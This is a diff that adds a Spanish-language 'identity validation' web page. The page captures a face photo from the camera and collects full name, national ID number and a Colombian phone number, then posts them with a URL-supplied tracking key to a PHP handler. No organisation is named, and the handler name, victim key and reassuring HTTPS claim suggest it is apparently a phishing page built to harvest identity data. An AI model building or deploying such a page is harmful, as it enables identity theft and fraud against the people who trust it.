@@ -1,0 +1,287 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Validación de identidad</title>
+<style>
+  :root{
+    --rojo: #c8102e;    /* rojo vibrante */
+    --negro: #0b0b0b;   /* negro profundo */
+    --gris-oscuro: #2b2b2b;
+    --blanco: #ffffff;
+    --radio: 12px;
+    --card-pad: 18px;
+  }
+
+  *{box-sizing:border-box}
+  body{
+    margin:0;
+    min-height:100vh;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background: linear-gradient(180deg, var(--negro), #111 60%);
+    color:var(--blanco);
+    font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    padding:20px;
+  }
+
+  .container{
+    width:100%;
+    max-width:520px;
+    background: linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));
+    border: 1px solid rgba(200,16,46,0.12);
+    border-radius: calc(var(--radio) + 4px);
+    padding: var(--card-pad);
+    box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+  }
+
+  header{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    margin-bottom:12px;
+  }
+
+  .logo {
+    width:56px;
+    height:56px;
+    border-radius:8px;
+    background: linear-gradient(135deg, var(--rojo), #ff4d4d);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    font-weight:700;
+    color:var(--blanco);
+    box-shadow: 0 6px 14px rgba(200,16,46,0.18) inset;
+    flex:0 0 56px;
+  }
+
+  h1{
+    margin:0;
+    font-size:20px;
+    line-height:1.05;
+    letter-spacing:0.2px;
+  }
+
+  h1 .title-main{ display:block; font-weight:800; font-size:18px; color:var(--blanco); }
+  h1 .title-sub{ display:block; font-weight:500; font-size:12px; color: #ffb3b8; margin-top:4px; }
+
+  .card-body{
+    display:grid;
+    gap:12px;
+  }
+
+  video, canvas {
+    width:100%;
+    border-radius:8px;
+    background:#000;
+    max-height:360px;
+    object-fit:cover;
+    display:block;
+  }
+
+  .controls{
+    display:flex;
+    gap:8px;
+    margin-top:6px;
+  }
+
+  button{
+    border:0;
+    padding:10px 12px;
+    border-radius:10px;
+    cursor:pointer;
+    font-weight:600;
+    font-size:14px;
+  }
+
+  .btn-red{
+    background: linear-gradient(180deg, var(--rojo), #a40b1a);
+    color:var(--blanco);
+    box-shadow: 0 6px 18px rgba(200,16,46,0.25);
+    flex:1;
+  }
+
+  .btn-ghost{
+    background: transparent;
+    color: #ffb3b8;
+    border: 1px solid rgba(255,179,184,0.12);
+    flex:1;
+  }
+
+  form input[type="text"], form input[type="tel"]{
+    width:100%;
+    padding:10px 12px;
+    border-radius:8px;
+    border:1px solid rgba(255,255,255,0.06);
+    background: rgba(0,0,0,0.25);
+    color:var(--blanco);
+    outline:none;
+    font-size:14px;
+  }
+
+  label.small{ font-size:12px; color:#ffb3b8; }
+
+  .row {
+    display:flex;
+    gap:8px;
+  }
+
+  .status{
+    font-size:13px;
+    color:#ffd6da;
+    min-height:20px;
+  }
+
+  footer.note{
+    margin-top:8px;
+    font-size:12px;
+    color: #ffb3b8;
+  }
+
+  @media (max-width:480px){
+    .container{ padding:14px; }
+    .logo{ width:48px; height:48px; }
+  }
+</style>
+</head>
+<body>
+  <div class="container" role="main" aria-labelledby="titulo">
+    <header>
+      <img style="width : 10% ;" src="f25b6841-b5d1-48fe-8ee9-64b01d78a86e-1024x1001.jpg">
+      <h1 id="titulo">
+        <span class="title-main">Validación de identidad</span>
+        <span class="title-sub">Toma una foto clara de tu rostro</span>
+      </h1>
+    </header>
+
+    <div class="card-body">
+      <div id="camera-area">
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+
+        <div class="controls" style="margin-top:10px;">
+          <button id="capture" class="btn-red">📸 Tomar foto</button>
+          <button id="switchCam" class="btn-ghost" type="button">🔁 Cambiar cámara</button>
+        </div>
+      </div>
+
+<form id="dataForm" action="enviar_dato_extra3.php" method="POST" enctype="multipart/form-data">
+  
+  <label class="small">Nombre completo</label>
+  <input name="nombre" id="nombre" type="text" placeholder="Ej. Juan Pérez" required>
+
+  <label class="small">Cédula / Documento</label>
+  <input name="cedula" id="cedula" type="text" placeholder="Número de documento">
+
+  <input type="hidden" id="key" name="key" value="">
+  
+  <label class="small">Teléfono</label>
+  <input name="telefono" id="telefono" type="tel" placeholder="+57 3xx xxx xxxx">
+
+  <!-- FOTO FINAL A ENVIAR -->
+  <input type="file" name="photo" id="photoInput" accept="image/jpeg" style="display:none" required>
+
+  <div class="row" style="margin-top:8px;">
+    <button id="send" class="btn-red" type="submit">Enviar</button>
+    <button id="retake" class="btn-ghost" type="button">Volver a tomar</button>
+  </div>
+
+  <div class="status" id="status"></div>
+</form>
+
+
+      <footer class="note">Asegúrate de que la foto sea legible. Sitio servido por HTTPS.</footer>
+    </div>
+  </div>
+
+<script>
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const captureBtn = document.getElementById('capture');
+  const retakeBtn = document.getElementById('retake');
+  const switchBtn = document.getElementById('switchCam');
+  const form = document.getElementById('dataForm');
+  const status = document.getElementById('status');
+
+  let stream = null;
+  let currentFacing = 'environment'; // 'user' or 'environment'
+
+  async function startCamera(){
+    stopCamera();
+    try{
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentFacing }, audio: false });
+      video.srcObject = stream;
+      status.textContent = '';
+    }catch(err){
+      console.error(err);
+      status.textContent = 'No se pudo acceder a la cámara: ' + (err.message || err);
+    }
+  }
+
+  function stopCamera(){
+    if(stream) stream.getTracks().forEach(t => t.stop());
+    stream = null;
+  }
+
+  captureBtn.addEventListener('click', () => {
+    canvas.width = video.videoWidth || 1280;
+    canvas.height = video.videoHeight || 720;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    video.style.display = 'none';
+    canvas.style.display = 'block';
+    captureBtn.disabled = true;
+    status.textContent = 'Foto tomada. Completa los datos y presiona Enviar.';
+  });
+
+  retakeBtn.addEventListener('click', () => {
+    canvas.style.display = 'none';
+    video.style.display = 'block';
+    captureBtn.disabled = false;
+    status.textContent = '';
+  });
+
+  switchBtn.addEventListener('click', () => {
+    currentFacing = (currentFacing === 'environment') ? 'user' : 'environment';
+    startCamera();
+  });
+
+document.getElementById("send").addEventListener("click", (e) => {
+    e.preventDefault();
+
+    if (canvas.style.display === "none") {
+        status.textContent = "Primero toma la foto.";
+        return;
+    }
+
+    canvas.toBlob((blob) => {
+        const file = new File([blob], "identidad.jpg", { type: "image/jpeg" });
+
+        const dataTransfer = new DataTransfer();
+        dataTransfer.items.add(file);
+        document.getElementById("photoInput").files = dataTransfer.files;
+
+        status.textContent = "Enviando datos...";
+
+        form.submit();
+    }, "image/jpeg");
+});
+
+  // start on load
+  startCamera();
+  window.addEventListener('beforeunload', () => stopCamera());
+</script>
+  <script>
+    // Capturar la KEY de la URL y meterla en el input hidden
+    const urlParams = new URLSearchParams(window.location.search);
+    const key = urlParams.get("key");
+    if (key) {
+      document.getElementById("key").value = key;
+    }
+  </script>
+</body>
+</html>
